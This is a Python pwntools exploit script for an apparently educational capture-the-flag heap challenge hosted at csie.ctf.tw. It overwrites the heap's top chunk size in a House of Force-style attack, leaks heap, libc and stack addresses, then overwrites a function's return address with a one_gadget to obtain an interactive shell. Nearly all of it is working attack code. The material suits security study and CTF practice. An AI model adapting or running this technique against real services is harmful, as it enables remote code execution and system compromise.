from pwn import *

context.arch='amd64'

import sys
if len(sys.argv) == 2:
    if sys.argv[1] == 'local':
        host = '127.0.0.1'
        port = 8888
    if sys.argv[1] == 'csie':
        host = 'csie.ctf.tw'
        port = 10141
else:
    print('Please tell me a server\'s name')
    sys.exit()

r = remote(host, port)

def allocate_heap(size, data, sendline=True, top=0, top_size=0):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if sendline:
        r.sendline(data)
    else:
        r.send(data)
    if top != 0:
        change = 0x10 + (size&0xfffffffffffffff0)
        return top + change, top_size - change

def show_heap():
    r.recvuntil(':')
    r.sendline(b'2')

def gen_new_top(new_top, data, old_top, old_top_size):
    nb = new_top - old_top - 0x10
    allocate_heap(nb, data)
    # print predicted
    new_top = old_top + (nb + 0x10)
    new_top_size = old_top_size - (nb + 0x10) % 0x10000000000000000
    return new_top, new_top_size

def overwrite_chunk_size():
    allocate_heap(0x18, b'c'*0x18 + p64(0xffffffffffffffff))
    r.recvuntil(':')

# leak top chunk address
allocate_heap(0xc8, b'a'*0xc8 + p64(0xf31))
r.recvuntil(':')
allocate_heap(0x1000, b'a')
allocate_heap(0x100, b'a'*0x10, False)
show_heap()
r.recvuntil('a'*0x10)
heap = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
# print('heap =', hex(heap))
top = heap + (0x11d0010 - 0x11ae0d0)
print('top =', hex(top))

glibc_stdin_got = 0x602030
glibc_stdin_off = 0x3c4861
__malloc_hook_off = (0x7f4355058b10 - 0x7f4354c9407f)
one_gadget_off = 0x45216
# one_gadget_off = 0x4526a
puts_off = 0x6f690

# leak libc
allocate_heap(0xe00-0x10, b'a')
overwrite_chunk_size()
top = top + 0x20
gen_new_top(glibc_stdin_got - 0x10, b'a', top, 0xfffffffffffffff8)
allocate_heap(0x10, b'a', False)
show_heap()
glibc_stdin = u64(r.recvuntil('\n')[1:-1].ljust(8, b'\x00'))
glibc_stdin = (glibc_stdin & 0xffffffffffffff00) + 0xe0
libc = glibc_stdin - glibc_stdin_off

# calculate addresses
one_gadget = libc + one_gadget_off - 0x7f
environ = libc + (0x7f4dd7484f38 - 0x7f4dd70be07f)
puts = libc + puts_off - 0x7f
print('libc          =', hex(libc))
print('puts          =', hex(puts))
print('one_gadget    =', hex(one_gadget))
print('environ       =', hex(environ))

# leak stack address by environ
overwrite_chunk_size()
gen_new_top(environ - 0x10, b'a', 0x602060, 0xfffffffffffffff8)
allocate_heap(0x10, b'a'*8, False)
show_heap()
r.recvuntil(b'a'*8)
stack = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
allocate_heap_ret = stack + (0x7ffdacf6d138 - 0x7ffdacf6d268)
print('stack         =', hex(stack))
print('allocate_heap_ret =', hex(allocate_heap_ret))

# change allocate_heap return address
overwrite_chunk_size()
gen_new_top(allocate_heap_ret-0x8 - 0x10, b'a', environ+0x28, 0xfffffffffffffff8)
allocate_heap(0x18, p64(allocate_heap_ret+0x18) + p64(one_gadget) + p64(0x400770) + p64(0x3c), False)

r.interactive()
